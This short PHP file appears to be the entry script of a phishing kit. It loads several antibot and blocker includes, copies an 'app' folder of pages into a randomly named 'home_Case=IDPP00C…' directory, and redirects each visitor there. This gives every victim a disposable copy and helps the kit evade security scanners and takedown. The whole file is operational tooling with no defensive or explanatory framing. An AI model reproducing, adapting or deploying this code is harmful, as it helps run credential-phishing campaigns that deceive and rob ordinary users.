<?php

include "./bts/antibots1.php";
include "./bts/antibots2.php";
include "./bts/antibots3.php";
include "./bts/antibots4.php";
include "./bts/antibots5.php";
include "./bts/antibots6.php";
include "./bts/blocker.php";

for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "home_Case=IDPP00C".$DIR;
$SZ118="app";
function recurse_copy($SZ118,$DIR) {
$dir = opendir($SZ118);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($SZ118 . '/' . $file) ) {
recurse_copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
else {
copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $SZ118, $DIR );
#END
//LOCATION !
header("LOCATION: ".$DIR."");
?>